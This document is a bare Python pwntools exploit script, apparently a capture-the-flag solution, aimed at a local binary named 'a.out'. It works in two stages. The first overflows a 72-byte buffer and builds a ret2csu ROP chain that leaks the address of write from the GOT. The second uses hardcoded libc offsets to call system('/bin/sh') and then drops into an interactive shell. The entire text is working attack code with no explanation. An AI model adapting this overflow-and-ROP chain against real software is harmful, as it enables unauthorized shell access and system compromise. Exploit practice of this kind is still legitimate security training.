#!/usr/bin/python 
from pwn import *
offset___libc_start_main_ret = 0x21f45
offset_system = 0x0000000000046590
offset_dup2 = 0x00000000000ebe90
offset_read = 0x00000000000eb6a0
offset_write = 0x00000000000eb700
offset_str_bin_sh = 0x17c8c3
write_got = 0x00601018
main_addr = 0x040057d
poprdi = 0x0400623
p6r    = 0x040061a
m3c    = 0x0400600

#context.log_level = 'debug'
p = process('a.out')

# function 1
# write(1,write_got,8);
payload1 =  "\x00" * 72
payload1 += p64(p6r) + p64(0) + p64(1) + p64(write_got) 
payload1 += p64(8) + p64(write_got) + p64(1) + p64(m3c)
payload1 += "\x00" * 56 + p64(main_addr)

p.recvuntil('pwn me\n\x00')
p.sendline(payload1)
write_addr = u64(p.recv(8))
system_addr = write_addr - offset_write + offset_system
log.debug("system addr = "+ hex(system_addr))
binsh = write_addr - offset_write + offset_str_bin_sh

#function 2
# system('/bin/sh')
payload2  = "\x00" * 72
payload2 += p64(poprdi) + p64(binsh) + p64(system_addr)

p.recvuntil('pwn me\n\x00')
p.sendline(payload2)

p.interactive()
